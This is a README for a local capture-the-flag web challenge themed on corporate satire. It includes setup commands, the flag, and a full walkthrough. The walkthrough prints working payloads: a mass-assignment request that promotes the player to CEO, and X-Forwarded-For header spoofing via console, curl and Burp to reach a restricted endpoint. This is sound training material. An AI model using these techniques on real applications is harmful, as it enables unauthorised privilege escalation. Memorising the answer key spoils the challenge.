# CTF Challenge 4: Initech SynergyDesk (Corporate Satire & Mass Assignment)

* **Category**: Corporate Satire / Web Exploitation (Mass Assignment & Header Bypass)
* **Difficulty**: Medium
* **Points**: 225
* **Target Port**: `http://localhost:8005`
* **Flag**: `CTF{c0rp0r4t3_syn3rgy_b0nus_4ppr0v3d_2026}`

---

## 🚀 How to Run (1-Command Startup)

Make sure **Docker** is running on your machine, then open your terminal in this directory:

### Any OS (Linux / Mac / Windows):
```bash
docker compose up -d --build
```

### Or using helper scripts:
* **Linux / Mac**: `chmod +x start.sh && ./start.sh`
* **Windows**: `.\start.ps1`

Once started, open your browser and navigate to:
👉 **`http://localhost:8005`**

To stop the containers:
```bash
docker compose down
```

---

## 🎯 Challenge Story & Description for Players
> *Initech Corporation has rolled out SynergyDesk 9.4 to optimize holistic cross-functional workforce alignment. You are logged in as Milton Waddams, an underappreciated associate working out of Basement Storage B with a 12% synergy rating. Can you navigate the corporate bureaucracy, alter your HR personnel file, and trick the Boardroom into releasing the CEO's multimillion-dollar Golden Parachute bonus?*

---

## 🔍 How to Solve (Walkthrough)

### Step 1: Mass Assignment (Promote Yourself to CEO)
The employee self-assessment endpoint updates your profile, but it does not sanitize the input fields. It blindly merges any JSON properties you send into your session object!

Open your browser's Developer Tools Console (`F12`), paste this code, and press **Enter**:
```javascript
fetch('/api/employee/update-kpi', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    role: "Chief_Executive_Officer",
    is_c_suite: true,
    synergy_score: 9999
  })
}).then(r => r.json()).then(console.log);
```
*(Or use Burp Suite to intercept the KPI form and add `"role": "Chief_Executive_Officer"`)*.  
Refresh the page: your title is now **Chief Executive Officer**!

---

### Step 2: Bypass the Boardroom Firewall (Header Spoofing)
Now visit the **Executive Bonus Vault** at `/api/executive/bonus-vault`.  
The server returns:
```json
{
  "error": "Access Denied: Connections must originate from the internal Executive Boardroom network."
}
```
The server checks client IP using the spoofable `X-Forwarded-For` header!

You can provide this header using any method:

#### Option A: In the Browser Console (`F12`)
```javascript
fetch('/api/executive/bonus-vault', {
  headers: { 'X-Forwarded-For': '127.0.0.1' }
}).then(r => r.json()).then(console.log);
```

#### Option B: Using cURL in Terminal
```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:8005/api/executive/bonus-vault
```

#### Option C: In Burp Suite
Send the request to Repeater and add:
```http
X-Forwarded-For: 127.0.0.1
```

---

### 🏆 Output & Flag
The Board of Directors approves the payout:
```json
{
  "success": true,
  "message": "Executive Golden Parachute & Bonus Package Approved by the Board of Directors!",
  "flag": "CTF{c0rp0r4t3_syn3rgy_b0nus_4ppr0v3d_2026}"
}
```

---

## 🤖 Automated Solver Verification
To verify the challenge automatically via Python:
```bash
python solution/solve.py
```
*(Requires `requests` library: `pip install requests`)*
